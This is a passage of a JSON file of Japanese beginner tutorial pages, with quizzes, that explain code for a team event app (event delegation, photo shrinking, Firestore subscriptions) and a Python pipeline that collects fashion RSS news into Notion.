data 属性 | 押したときにすること |\n|---|---|\n| `data-tab` | タブを切り替える（最後のタブとして端末に記憶） |\n| `data-me` | 「あなたは誰？」で名前を選ぶ |\n| `data-act` | 設定を開く・閉じる・写真を取り消す |\n| `data-filter` | タスクを担当者で絞り込む |\n| `data-cycle` | タスクの状態を 未着手 → 進行中 → 完了 → 未着手 と回す |\n| `data-toggle` | 予定の完了チェック |\n| `data-like` | いいねを付ける・外す |\n| `data-del` | 確認してから削除（`\"tasks:abc123\"` を `:` で分けて種類と ID を取り出す） |\n\n### 状態を回す：対応表を使ったトリック\n\n```javascript\n{ todo: \"doing\", doing: \"done\", done: \"todo\" }[x.status] || \"todo\"\n```\n\n「今が todo なら次は doing」という **対応表をその場で作って、今の状態で引く** 書き方です。if を 3 つ並べるより短く書けます。\n\n### いいねの付け外し\n\n```javascript\nlikes.includes(S.me) ? likes.filter(n => n !== S.me) : [...likes, S.me]\n```\n\n自分の名前が入っていれば取り除き（いいね解除）、入っていなければ末尾に足す（いいね）。どちらも **新しい配列を作って** 保存しています。\n\n### フォームの送信\n\n```javascript\ne.preventDefault();\nconst v = Object.fromEntries(new FormData(f));\n```\n\n- `preventDefault()`：フォームを送信すると、普通はページが再読み込みされる。それを止めて JavaScript で処理する\n- `new FormData(f)`：フォームの入力欄を `name` ごとに集める\n- `Object.fromEntries(...)`：`{ title: \"会場を探す\", assignee: \"メンバーA\", due: \"2027-01-10\" }` のようなオブジェクトにする\n\n`<input name=\"title\">` の `name` が、そのまま `v.title` の名前になります。\n\n### 名前を選んでいないと書き込めない\n\n```javascript\nif (!S.me) return showWho();\nconst author = S.me;\n```\n\n誰が書いたかを `author` として一緒に保存するため、名前が未選択なら先に「あなたは誰？」を出します。\n\n### 変更したあと、画面はいつ変わる？\n\n`store.update(...)` を呼んでも、ここでは `render()` を呼んでいません（タブの切り替えなどは除く）。\n**データが変わると Firebase から知らせが届き、そこで描き直される** からです（3 ページ目の `onSnapshot`、8 ページ目の購読）。データの流れが一方通行になっているので、自分の変更も他の人の変更も、同じ道を通って画面に反映されます。\n\n## 🐍 Python と比べると\n\n| JavaScript | Python で言うと |\n|---|---|\n| `document.addEventListener(\"click\", e => ...)` | （ブラウザ専用）「クリックされたらこの関数を呼んで」と登録する |\n| `if (d.tab) ... else if (d.me) ...` | `if d.get(\"tab\"): ... elif d.get(\"me\"): ...` |\n| `{todo: \"doing\", ...}[x.status] \\|\\| \"todo\"` | `{\"todo\": \"doing\", ...}.get(x[\"status\"], \"todo\")` |\n| `const [col, id] = d.del.split(\":\")` | `col, id = d[\"del\"].split(\":\")` |\n| `confirm(\"削除しますか？\")` | `input(\"削除しますか？ (y/n) \") == \"y\"` |\n\n## 🔑 キーワード\n\n- **イベント**：クリック・送信・入力など、利用者の操作\n- **イベント委任**：親の要素（ここでは document）でまとめてイベントを受け止める方法\n- **バブリング**：イベントが内側の要素から外側へ伝わっていく性質\n- **closest**：外側へたどって、条件に合う一番近い要素を探すメソッド\n- **dataset / data 属性**：HTML 要素に付けたメモ書きを、JavaScript から読む仕組み\n- **モーダル**：画面の上に重ねて出す小窓\n- **FormData**：フォームの入力値をまとめて取り出す仕組み\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ イベント委任で、画面を作り直してもボタンの処理が消えない\n- ✅ 削除の前に確認を出している\n- ✅ 名前が未選択なら書き込む前に選ばせる\n- ⚠️ アイデア以外の保存（`store.add` / `update` / `remove`）は **失敗しても何も表示されない**。通信が切れていると、追加したつもりのタスクが消えたように見えることがある（Firestore はオフラインでも一時的に覚えておき、つながったら送る機能があるので、多くの場合は後で反映される）\n- ⚠️ 写真を拡大表示するとき `z.src` をそのまま HTML に入れている（6 ページ目と同じ注意点）\n- ⚠️ 長い `if / else if` の連続。機能が増えるとさらに長くなるので、data 属性ごとの処理を対応表（オブジェクト）にまとめる書き方もある\n\n## 🗣️ 30 秒で人に説明するなら\n\n「イベント処理は、ページ全体で 1 つだけクリックと送信を受け止める『イベント委任』で作っています。押されたボタンの data 属性、たとえば data-cycle や data-like を見て、タスクの状態を回したり、いいねを付け外ししたりしています。\nフォームは FormData で入力値をまとめて取り出して保存します。保存したあとはここでは描き直さず、データベースから届く変更の知らせで画面が更新される仕組みです。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "状態が「進行中（doing）」のタスクのボタンを押すと、次は？",
      "choices": [
       "未着手",
       "完了",
       "削除される"
      ],
      "answer": 1,
      "explain": "対応表 { todo: \"doing\", doing: \"done\", done: \"todo\" } で次の状態を引きます。"
     },
     {
      "question": "ボタンごとではなく document でクリックを受け止めている主な理由は？",
      "choices": [
       "render() で画面を作り直してもボタンの処理が消えないから",
       "そうしないとクリックできないから",
       "処理が速くなるから"
      ],
      "answer": 0,
      "explain": "ボタンは描き直すたびに新しくなるので、親でまとめて受け止める方が確実です。"
     },
     {
      "question": "フォームの送信で `e.preventDefault()` をしないと？",
      "choices": [
       "入力値が取り出せない",
       "ページが再読み込みされてしまう",
       "データが 2 回保存される"
      ],
      "answer": 1,
      "explain": "フォームの標準の動き（再読み込み）を止めて、JavaScript で処理しています。"
     }
    ]
   ],
   "id": "2026-11-17-popup2027-07-events"
  },
  {
   "title": "写真の縮小とリアルタイム更新 ― 入力中は描き直さない工夫",
   "language": "JavaScript",
   "date": "2026-11-17",
   "level": 4,
   "series": "popup2027",
   "part": 8,
   "concepts": [
    "async",
    "dom_ui",
    "data_formats",
    "errors",
    "database"
   ],
   "lessons": [
    "20-javascript/07-promise-async",
    "20-javascript/06-dom-events",
    "20-javascript/02-control-flow"
   ],
   "summary": "写真を 1MB の上限に収まるよう小さくして文字列にする処理と、データの変更を購読して画面を更新する（入力中は待つ）仕組み。",
   "body": "## 📄 解説するコード（362〜403 行目）\n\n```javascript\n// ---------- 写真 ----------\ndocument.addEventListener(\"input\", e => { if (e.target.matches('[data-form=\"ideas\"] textarea')) S.ideaDraft = e.target.value; });\ndocument.addEventListener(\"change\", async e => {\n  const inp = e.target.closest(\"[data-photo]\"); if (!inp || !inp.files[0]) return;\n  S.busy = true; render();\n  try { S.ideaPhoto = await shrink(inp.files[0]); }\n  catch { alert(\"この画像は読み込めませんでした\"); }\n  S.busy = false; render();\n});\n// 写真を縮小して JPEG の文字列にする（データベースの1件あたり上限 1MB に収める）\nasync function shrink(file) {\n  const url = URL.createObjectURL(file);\n  try {\n    const img = await new Promise((ok, ng) => { const i = new Image(); i.onload = () => ok(i); i.onerror = ng; i.src = url; });\n    let max = 1280, q = 0.78, out = \"\";\n    for (let n = 0; n < 6; n++) {\n      const r = Math.min(1, max / Math.max(img.naturalWidth, img.naturalHeight));\n      const c = document.createElement(\"canvas\");\n      c.width = Math.round(img.naturalWidth * r); c.height = Math.round(img.naturalHeight * r);\n      c.getContext(\"2d\").drawImage(img, 0, 0, c.width, c.height);\n      out = c.toDataURL(\"image/jpeg\", q);\n      if (out.length < 700000) return out;\n      max *= 0.8; q -= 0.08;\n    }\n    return out;\n  } finally { URL.revokeObjectURL(url); }\n}\n\n// ---------- 購読 ----------\nlet rendered = false;\nconst rerender = () => {\n  // 入力中のフォームは消さない\n  const a = document.activeElement;\n  if (rendered && a && a.closest(\"form\") && (a.value || \"\").length) return pending = true;\n  render(); rendered = true;\n};\nlet pending = false;\ndocument.addEventListener(\"focusout\", () => setTimeout(() => { if (pending && !document.activeElement?.closest(\"form\")) { pending = false; render(); } }, 0));\n\nstore.subSettings(s => { S.settings = { ...DEFAULT_SETTINGS, ...(s || {}) }; rerender(); if (!S.me || !S.settings.members.includes(S.me)) showWho(); });\nCOLS.forEach(c => store.sub(c, rows => { S[c] = rows; rerender(); }));\nrender();\n```\n\n## 🧭 ひとことで言うと\n\n**JavaScript** で書かれた、アプリの最後の部品です。前半は **写真をデータベースに入る大きさまで小さくする** 処理、後半は **データの変更を購読して画面を更新する**（ただし、文字を入力している最中は描き直さない）仕組みです。このシリーズで一番むずかしい部分なので、図を思い浮かべながら読みましょう。\n\n## 🗺️ 全体の流れ\n\n**写真を選んだとき**\n1. ファイル選択の変化（`change`）を受け取る\n2. 「処理中…」を表示（`S.busy = true`）\n3. `shrink()` で写真を縮小し、JPEG の **文字列** にして `S.ideaPhoto` に入れる\n4. 「処理中…」を消して描き直す（プレビューが出る）\n\n**アプリの起動時（購読の開始）**\n1. 設定と 5 種類のデータを購読する\n2. データが変わるたびに `S` に入れて `rerender()`\n3. `rerender()` は、誰かが文字を入力中なら描き直しを **保留** し、入力欄から離れたときにまとめて描き直す\n\n## 🔍 ブロックごとの解説\n\n### なぜ写真を小さくする？\n\nFirestore は **1 件のデータの大きさが最大 1MB** という決まりがあります。スマホの写真は数 MB あるので、そのままでは保存できません。\nこのアプリは写真を別の保存場所に置かず、**写真を文字列（Data URL）に変換して、アイデアのデータの中に直接入れる** 方式なので、小さくする必要があります。\n\n### shrink：少しずつ小さくして、入るまで試す\n\n```javascript\nlet max = 1280, q = 0.78, out = \"\";\nfor (let n = 0; n < 6; n++) {\n  ...\n  out = c.toDataURL(\"image/jpeg\", q);\n  if (out.length < 700000) return out;\n  max *= 0.8; q -= 0.08;\n}\n```\n\n1. 長い辺を最大 1280 ピクセル、画質 78% で JPEG にしてみる\n2. 文字列が 70 万文字より小さければ完成\n3. 大きすぎたら、サイズを 80% に、画質を 8% 下げて、もう一度（最大 6 回）\n\n| 回 | 長い辺の最大 | 画質 |\n|---|---|---|\n| 1 | 1280 | 0.78 |\n| 2 | 1024 | 0.70 |\n| 3 | 約 819 | 0.62 |\n| … | … | … |\n\n70 万文字にしているのは、1MB の上限に対して、文字（タイトルなど）の分の余裕を残すためです。\n\n### canvas：ブラウザの中の「お絵かき帳」\n\n```javascript\nconst c = document.createElement(\"canvas\");\nc.getContext(\"2d\").drawImage(img, 0, 0, c.width, c.height);\nout = c.toDataURL(\"image/jpeg\", q);\n```\n\n画面に見えない **お絵かき帳（canvas）** を作り、写真を小さいサイズで描き写して、それを JPEG の文字列として取り出しています。画像の縮小でよく使われる方法です。\n\n### 画像の読み込みを Promise にする\n\n```javascript\nconst img = await new Promise((ok, ng) => { const i = new Image(); i.onload = () => ok(i); i.onerror = ng; i.src = url; });\n```\n\n画像の読み込みは「終わったら onload を呼ぶ」という古い形（コールバック）です。それを `new Promise` で包んで、`await` で待てる形に変えています。\n\n- `ok`（resolve）：成功したら呼ぶ → `await` の結果が `i` になる\n- `ng`（reject）：失敗したら呼ぶ → 例外になり、呼び出し元の `catch` で「読み込めませんでした」と表示\n\n`URL.createObjectURL` で作った一時的な URL は、`finally` の `revokeObjectURL` で **必ず片付けて** います（メモリの節約）。\n\n### rerender：入力中は描き直さない\n\n`render()` は画面を丸ごと作り直すので、**文字を入力している最中に他のメンバーの変更が届くと、入力中の文字が消えてしまいます**。それを防ぐ工夫です。\n\n```javascript\nconst a = document.activeElement;\nif (rendered && a && a.closest(\"form\") && (a.value || \"\").length) return pending = true;\n```\n\n「今カーソルがあるのがフォームの中で、何か入力されている」なら、描き直さずに `pending = true`（あとで描き直す印）だけ付けて終わります。\n\n```javascript\ndocument.addEventListener(\"focusout\", () => setTimeout(() => {\n  if (pending && !document.activeElement?.closest(\"form\")) { pending = false; render(); }\n}, 0));\n```\n\n入力欄からカーソルが離れたとき（`focusout`）に、印が付いていれば描き直します。\n`setTimeout(..., 0)` は「今の処理が終わった直後に実行して」という意味で、**カーソルの移動先が確定してから** 調べるためのものです。\n\nアイデアの下書き（`S.ideaDraft`）は、入力のたびに `S` に保存しているので、描き直しても消えません。\n\n### 購読の開始：アプリが動き出す場所\n\n```javascript\nstore.subSettings(s => { S.settings = { ...DEFAULT_SETTINGS, ...(s || {}) }; rerender(); ... });\nCOLS.forEach(c => store.sub(c, rows => { S[c] = rows; rerender(); }));\nrender();\n```\n\n- 設定を購読：届いた設定を **初期値に上書き** する形で入れる（`{ ...初期値, ...届いた値 }`）。自分の名前が今のメンバーにいなければ「あなたは誰？」を出す\n- 5 種類のデータを購読：届くたびに `S.tasks` などを入れ替えて描き直す\n- 最後の `render()`：データが届く前に、まず一度画面を出しておく\n\nここが、ここまでのページで見てきた部品が **一本の流れにつながる** 場所です。\n\n```text\n操作（7 ページ目）→ store に保存（3 ページ目）→ 変更の知らせ（ここ）→ S を更新 → render（5・6 ページ目）\n```\n\n## 🐍 Python と比べると\n\n| JavaScript | Python で言うと |\n|---|---|\n| `new Promise((ok, ng) => ...)` | `asyncio.Future` を作って、終わったら `set_result` する |\n| `try { ... } finally { 片付け }` | `try: ... finally: 片付け`（同じ） |\n| canvas で縮小 | Pillow の `img.thumbnail((1280, 1280))` と `img.save(..., quality=78)` |\n| `{ ...DEFAULT_SETTINGS, ...s }` | `{**DEFAULT_SETTINGS, **s}` |\n| `setTimeout(f, 0)` | `loop.call_soon(f)`（今の処理の直後に実行） |\n\n## 🔑 キーワード\n\n- **Data URL**：画像などを `data:image/jpeg;base64,...` という文字列で表したもの\n- **canvas**：ブラウザの中で絵を描いたり画像を加工したりできる要素\n- **Promise 化**：コールバック形式の処理を、`await` で待てる形に包むこと\n- **購読（subscribe）**：データの変化を見張り、変わったら知らせてもらうこと\n- **フォーカス**：今どの入力欄にカーソルがあるか（`document.activeElement`）\n- **保留フラグ**：「あとでやる」ことを覚えておく印（ここでは `pending`）\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ 写真を上限に収まるまで段階的に小さくし、失敗したら分かりやすく知らせる\n- ✅ 一時的な URL を `finally` で必ず片付けている\n- ✅ 入力中に他の人の変更が届いても、入力が消えないよう工夫している\n- ⚠️ 写真をデータベースの中に文字列で保存しているので、アイデアが増えると **アプリを開くたびに全部の写真を読み込む** ことになり、重く・通信量が多くなる。写真が増えるなら Firebase Storage（ファイル置き場）に分けるのが一般的\n- ⚠️ 6 回小さくしても 70 万文字を超える場合でも、そのまま返している。その場合はデータベースへの保存に失敗し、「投稿に失敗しました」と表示される\n- ⚠️ `pending` は使われる行より後ろ（398 行目）で宣言されている。実際に使われるのは起動後なので動くが、宣言を上にまとめた方が読みやすい\n\n## 🗣️ 30 秒で人に説明するなら\n\n「写真は Firestore の 1 件 1MB の上限に入るよう、canvas で縮小して JPEG の文字列にしています。入らなければサイズと画質を少しずつ下げて最大 6 回試します。\n起動時には設定と 5 種類のデータを購読して、変更が届くたびに状態を更新して描き直します。ただし入力中に描き直すと文字が消えるので、そのときは保留しておいて、入力欄から離れたときに描き直す工夫をしています。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "写真を縮小している一番の理由は？",
      "choices": [
       "画面に収まるようにするため",
       "データベースの 1 件あたりの上限（1MB）に収めるため",
       "色をきれいにするため"
      ],
      "answer": 1,
      "explain": "写真を文字列にしてデータの中に入れているので、上限に収める必要があります。"
     },
     {
      "question": "文字を入力している最中に、他のメンバーがタスクを追加した。何が起きる？",
      "choices": [
       "すぐには描き直さず、入力欄から離れたときに描き直す",
       "入力中の文字が消える",
       "追加されたタスクは表示されない"
      ],
      "answer": 0,
      "explain": "rerender が pending の印を付けて保留し、focusout で描き直します。"
     },
     {
      "question": "`{ ...DEFAULT_SETTINGS, ...(s || {}) }` で、届いた設定に date が無い場合の date は？",
      "choices": [
       "undefined",
       "DEFAULT_SETTINGS の \"2027-09-01\"",
       "エラーになる"
      ],
      "answer": 1,
      "explain": "後ろに書いた方が上書きするので、届いた値に無い項目は初期値のまま残ります。"
     }
    ]
   ],
   "id": "2026-11-17-popup2027-08-photo-sync"
  },
  {
   "title": "fashion_news の全体像 ― ニュースを集めて Notion にまとめるロボット",
   "language": "Python",
   "date": "2026-11-16",
   "level": 2,
   "series": "fashion_news",
   "part": 1,
   "concepts": [
    "reading",
    "modules",
    "http_api",
    "data_formats",
    "testing",
    "tooling"
   ],
   "lessons": [
    "00-basics/02-how-to-read-code",
    "10-python/08-modules",
    "10-python/11-files-and-json",
    "100-ai-dev/08-testing"
   ],
   "summary": "毎日 2 回、ファッションニュースの RSS を集めてジャンル分けし、Notion に「朝刊・夕刊」ページを作るプログラムの全体像。",
   "body": "> 📚 このページは **fashion_news シリーズの 1 ページ目（全体像）** です。ここで地図をつかんでから、2 ページ目以降でファイルを 1 つずつ読んでいきます。\n\n## 📄 解説するコード（ファイルの一覧）\n\n```text\nfashion_news/\n├── README.md                     使い方の説明書\n├── REQUIREMENTS.md               要件定義書（何を作るかの設計図）\n├── requirements.txt              必要なライブラリの一覧\n├── config/\n│   ├── sources.yaml              ニュースを集める先（RSS）の一覧        → 3 ページ目\n│   └── categories.yaml           ジャンル分けのキーワード辞書           → 3 ページ目\n├── src/fashion_news/\n│   ├── __main__.py               「python -m fashion_news」の入口        → 2 ページ目\n│   ├── models.py                 記事 1 件のデータの形（Article）        → 2 ページ目\n│   ├── fetch.py                  RSS を取ってくる                        → 4 ページ目\n│   ├── classify.py               ジャンルに分ける                        → 5 ページ目\n│   ├── dedupe.py                 古い記事・重複を取り除く                → 6 ページ目\n│   ├── notion.py                 Notion にページを作る                   → 7 ページ目\n│   └── main.py                   全体の司令塔（上の部品を順に呼ぶ）      → 8 ページ目\n├── data/seen_urls.json           これまでに載せた記事の URL の記録\n├── .github/workflows/daily.yml   毎日 2 回、自動で動かす設定             → 9 ページ目\n└── tests/test_pipeline.py        部品が正しく動くか確かめるテスト        → 10 ページ目\n```\n\n## 🧭 ひとことで言うと\n\n**Python** で書かれた、**毎朝・毎夕、日本語のファッションニュースを自動で集め、ジャンル別に整理して Notion に「朝刊」「夕刊」ページを作るロボット** です。\nGitHub Actions（GitHub の自動実行サービス）が決まった時刻に起動するので、パソコンの電源が切れていても動きます。\n\n## 🗺️ 全体の流れ\n\n工場の流れ作業（ベルトコンベア）をイメージすると分かりやすいです。\n\n1. **起動**：毎日 6:30 と 17:30（日本時間）に GitHub Actions がプログラムを動かす（`daily.yml`）\n2. **準備**：設定ファイル（どのサイトから集めるか・ジャンルのキーワード）と、過去に載せた記事の記録を読み込む（`main.py`）\n3. **集める（入力）**：8 つのニュースサイトの RSS を取ってきて、記事のリストにする（`fetch.py`）\n4. **ふるいにかける**：36 時間より古い記事、ファッションと関係ない記事、重複している記事、過去に載せた記事を取り除く（`classify.py`・`dedupe.py`）\n5. **仕分ける**：タイトルのキーワードで 6 つのジャンルに分け、各ジャンル新しい順に最大 20 件にする（`classify.py`・`main.py`）\n6. **届ける（出力）**：Notion に「2026-11-16 朝刊」のようなページを作り、ジャンルごとに見出し＋リンクを並べる（`notion.py`）\n7. **記録する**：載せた記事の URL を `seen_urls.json` に書き足し、GitHub に保存する（次回の重複防止）\n\n## 🔍 ブロックごとの解説\n\n### 部品ごとに 1 ファイル\n\nこのプロジェクトは、**1 つのファイルに 1 つの役割** を持たせています。\n\n| 役割 | ファイル | たとえ |\n|---|---|---|\n| データの形 | `models.py` | 伝票の書式 |\n| 集める | `fetch.py` | 仕入れ担当 |\n| 仕分ける | `classify.py` | 仕分け担当 |\n| 選別する | `dedupe.py` | 検品担当 |\n| 届ける | `notion.py` | 配送担当 |\n| 指示を出す | `main.py` | 工場長 |\n\nこう分けておくと、「Notion の代わりに LINE に送りたい」となっても `notion.py` の部分だけ取り替えればよく、他は触らずに済みます。\n\n### 設定とコードを分けている\n\nニュースを集めるサイトや、ジャンル分けのキーワードは **コードではなく YAML ファイル** に書いてあります。\nそのため「このサイトも追加したい」「このキーワードも『スニーカー』扱いにしたい」は、Python を書き換えずに設定ファイルを直すだけでできます。\n\n### 記録をファイルに残して、重複を防ぐ\n\nプログラムは毎回まっさらな状態で起動するので、「昨日どの記事を載せたか」を覚えていません。\nそこで `data/seen_urls.json` に **載せた記事の URL と日付** を書いておき（30 日分）、次回はそこに載っている記事を除外します。\n\n### テストがある\n\n`tests/test_pipeline.py` に、各部品が期待どおり動くかを確かめるテストが 11 個あります。AI に修正を頼んだときに、前の機能を壊していないかすぐに確かめられます。\n\n## 🐍 Python の書き方で見落としやすい点\n\n| 見かけるもの | 意味 |\n|---|---|\n| `src/fashion_news/` というフォルダ構成 | プログラム本体を `src` の下の「パッケージ」（フォルダ単位のモジュール）にまとめる、よくある形 |\n| `from .models import Article` の `.` | 「同じパッケージ（フォルダ）の中の models から」という意味（相対 import） |\n| `python -m fashion_news` | ファイル名ではなくパッケージ名で実行する方法。`__main__.py` が入口になる |\n| `PYTHONPATH=src` | 「`src` フォルダの中もライブラリとして探して」と Python に伝える環境変数 |\n\n## 🔑 キーワード\n\n- **RSS**：ニュースサイトが「新着記事の一覧」を機械向けに配っている形式（XML というデータ形式）\n- **Notion API**：プログラムから Notion を操作するための窓口\n- **GitHub Actions**：GitHub が決まった時刻やきっかけでプログラムを動かしてくれる仕組み\n- **YAML**：設定ファイルによく使われる、人が読み書きしやすいデータ形式\n- **パイプライン**：集める → ふるう → 仕分ける → 届ける、のように処理を順番につなげた流れ\n- **ドライラン（dry run）**：本番の書き込みをせず、結果を画面に表示するだけの試し運転\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ 役割ごとにファイルが分かれていて、テストもある。とても読みやすい構成\n- ✅ 1 つのサイトの取得に失敗しても、他のサイトは続けて処理する\n- ✅ Notion のトークン（パスワードのようなもの）は GitHub の Secrets に置いていて、コードには書いていない\n- ⚠️ このリポジトリは **公開（Public）** になっている。README に Notion の親ページ ID が書かれており、`seen_urls.json` から読んだ記事の履歴も誰でも見られる。トークンが無ければページ ID だけでは操作できないが、気になるなら非公開にするとよい\n- ⚠️ 要件定義書では「1 つの記事に複数のジャンルを付けてよい」となっているが、実装は **最初に当たった 1 ジャンルだけ** に入れる。仕様と実装のずれ（意図的に簡単にした可能性もある）\n- 必要な準備：Notion のインテグレーション（連携用の設定）と、GitHub Secrets への `NOTION_TOKEN`・`NOTION_PARENT_PAGE_ID` の登録\n\n## 🗣️ 30 秒で人に説明するなら\n\n「これは毎朝と毎夕、ファッション系ニュースサイトの RSS を自動で集めて、Notion に朝刊・夕刊のページを作るプログラムです。\nGitHub Actions で定時に動いて、記事を集めたら古いものや重複を取り除き、タイトルのキーワードでハイブランドやスニーカーなどのジャンルに分けています。\n一度載せた記事は JSON ファイルに記録しておいて、次の回には出ないようにしています。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "このプログラムを毎日決まった時刻に動かしているのは？",
      "choices": [
       "自分のパソコンのタイマー",
       "GitHub Actions",
       "Notion の自動化機能"
      ],
      "answer": 1,
      "explain": "`.github/workflows/daily.yml` に時刻が書かれていて、GitHub のサーバーで動きます。"
     },
     {
      "question": "「この記事は昨日もう載せた」と判断するために使っているのは？",
      "choices": [
       "Notion のページを毎回すべて読む",
       "data/seen_urls.json に記録した URL",
       "記事の公開日だけ"
      ],
      "answer": 1,
      "explain": "載せた記事の URL を 30 日分ファイルに記録し、次回はそこにある記事を除外します。"
     },
     {
      "question": "ニュースを集めるサイトを 1 つ追加したい。主に書き換えるのは？",
      "choices": [
       "fetch.py",
       "main.py",
       "config/sources.yaml"
      ],
      "answer": 2,
      "explain": "情報源は設定ファイルで管理しているので、コードを変えずに追加できます。"
     }
    ]
   ],
   "id": "2026-11-16-fashion-news-01-overview"
  },
  {
   "title": "models.py と __main__.py ― 記事 1 件の「伝票の書式」とプログラムの入口",
   "language": "Python",
   "date": "2026-11-16",
   "level": 2,
   "series": "fashion_news",
   "part": 2,
   "concepts": [
    "classes",
    "type_hints",
    "modules"
   ],
   "lessons": [
    "10-python/10-classes",
    "10-python/12-type-hints-dataclass",
    "10-python/08-modules"
   ],
   "summary": "記事データの形を決める dataclass と、python -m で実行したときの入口。",
   "body": "## 📄 解説するコード\n\n`src/fashion_news/models.py`\n\n```python\nfrom __future__ import annotations\n\nfrom dataclasses import dataclass\nfrom datetime import datetime\n\n\n@dataclass\nclass Article:\n    title: str\n    url: str\n    source: str\n    kind: str  # media / official / sns\n    published: datetime | None = None  # UTC。不明なら None\n    category: str = \"\"\n```\n\n`src/fashion_news/__main__.py`\n\n```python\nfrom .main import main\n\nmain()\n```\n\n（`__init__.py` は中身が空のファイルです）\n\n## 🧭 ひとことで言うと\n\n**Python** のファイル 2 つです。`models.py` は「記事 1 件がどんな情報を持つか」という **データの形（Article）** を決め、`__main__.py` は `python -m fashion_news` で実行されたときの **入口** です。\n\n## 🗺️ 全体の流れ\n\n1. `python -m fashion_news` と実行すると、Python は `fashion_news` フォルダの `__main__.py` を探して実行する\n2. `__main__.py` は `main.py` の `main()` 関数を呼ぶだけ\n3. プログラムのあちこちで、記事は `Article` の形で受け渡しされる\n\n## 🔍 ブロックごとの解説\n\n### @dataclass：データを入れるための箱を簡単に作る\n\n```python\n@dataclass\nclass Article:\n    title: str\n    url: str\n```\n\n`@dataclass` を付けると、`__init__`（作るときの初期化処理）を Python が自動で作ってくれます。\nなので、次のように 1 行で記事を作れます。\n\n```python\na = Article(\"パリコレ開幕\", \"https://...\", \"WWDJAPAN\", \"media\")\na.title   # \"パリコレ開幕\"\n```\n\n辞書 `{\"title\": ..., \"url\": ...}` でも同じ情報は持てますが、クラスにしておくと\n**キーのタイプミスに気づける**、**どんな項目があるか一目で分かる** という利点があります。\n\n### 各項目の意味\n\n| 項目 | 型 | 意味 |\n|---|---|---|\n| `title` | `str` | 記事のタイトル |\n| `url` | `str` | 記事のリンク |\n| `source` | `str` | どのサイトから来たか（例：WWDJAPAN） |\n| `kind` | `str` | 情報源の種類。`media`（メディア）/ `official`（公式発表）/ `sns`（SNS の話題） |\n| `published` | `datetime \\| None` | 公開日時。分からなければ `None` |\n| `category` | `str` | あとで付けるジャンル名。最初は空文字 |\n\n`= None` や `= \"\"` のように **初期値があるものは、作るときに省略できます**。\n`published` は RSS によっては日付が無いことがあるので、`None`（なし）も許しています。\n\n### from __future__ import annotations\n\n型ヒントの書き方を新しいルールで扱うための 1 行です。`datetime | None` のような新しめの書き方を、古い Python でも使えるようにするためのお守りだと思っておけば十分です。\n\n### __main__.py と __init__.py\n\n| ファイル | 役割 |\n|---|---|\n| `__init__.py` | 「このフォルダは Python のパッケージです」という目印。中身は空でもよい |\n| `__main__.py` | `python -m パッケージ名` で実行されたときに最初に動くファイル |\n\n`from .main import main` の `.` は「同じフォルダの」という意味（相対 import）です。\n\n## 🐍 Python の書き方で見落としやすい点\n\n| 書き方 | ポイント |\n|---|---|\n| `datetime \\| None` | 「datetime か None のどちらか」。使う側は None のときの処理が必要になる（実際 `main.py` で `a.published or oldest` と対処している） |\n| `kind: str  # media / official / sns` | 型は `str` なので、実は何の文字列でも入ってしまう。コメントで決まりごとを伝えている |\n| `@dataclass` | 自動で `__init__` に加え、表示用の `__repr__`、比較用の `__eq__` も作ってくれる（テストで `==` 比較できるのはこのおかげ） |\n\n## 🔑 キーワード\n\n- **dataclass**：データを入れるためのクラスを簡単に作る仕組み\n- **型ヒント**：`title: str` のように、どんな値が入るかを書いた注釈\n- **None**：「値が無い」ことを表す特別な値\n- **パッケージ**：Python のファイルをまとめたフォルダ\n- **相対 import**：`from .main import ...` のように、同じパッケージ内から読み込む書き方\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ データの形が 1 か所にまとまっていて、どのファイルからも同じ `Article` を使っている\n- ✅ 日付が無い場合を `None` で表し、型ヒントにも明記している\n- ⚠️ `kind` は自由な文字列なので、`sources.yaml` で `\"medai\"` のように打ち間違えてもエラーにならない（`Literal[\"media\", \"official\", \"sns\"]` という型にすれば防げる）\n\n## 🗣️ 30 秒で人に説明するなら\n\n「models.py では、記事 1 件が持つ情報を Article という dataclass で決めています。タイトル・URL・出典・種類・公開日時・ジャンルの 6 つです。\n公開日時は分からないこともあるので None を許していて、ジャンルは後から入れるので最初は空です。\n__main__.py は、python -m fashion_news で起動したときに main 関数を呼ぶだけの入口です。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "`Article(\"見出し\", \"https://x\", \"WWD\", \"media\")` で作った記事の `published` は？",
      "choices": [
       "今の日時",
       "None",
       "エラーになる"
      ],
      "answer": 1,
      "explain": "初期値が None なので、省略するとそのまま None になります。"
     },
     {
      "question": "`@dataclass` を付けると何が楽になる？",
      "choices": [
       "`__init__` などを自動で作ってくれる",
       "自動でデータベースに保存される",
       "型が違うと必ずエラーになる"
      ],
      "answer": 0,
      "explain": "型ヒントは注釈なので、dataclass でも型の強制はされません。"
     },
     {
      "question": "`python -m fashion_news` で最初に実行されるファイルは？",
      "choices": [
       "main.py",
       "__main__.py",
       "__init__.py"
      ],
      "answer": 1,
      "explain": "-m でパッケージを実行すると __main__.py が入口になります（その前に __init__.py も読まれます）。"
     }
    ]
   ],
   "id": "2026-11-16-fashion-news-02-models"
  },
  {
   "title": "sources.yaml と categories.yaml ― 集める先と仕分けルールの設定ファイル",
   "language": "YAML",
   "date": "2026-11-16",
   "level": 1,
   "series": "fashion_news",
   "part": 3,
   "concepts": [
    "data_formats",
    "collections"
   ],
   "lessons": [
    "10-python/04-lists-and-dicts",
    "10-python/11-files-and-json"
   ],
   "summary": "コードを書き換えずに情報源やジャンルの辞書を変えられる、2 つの YAML 設定ファイル。",
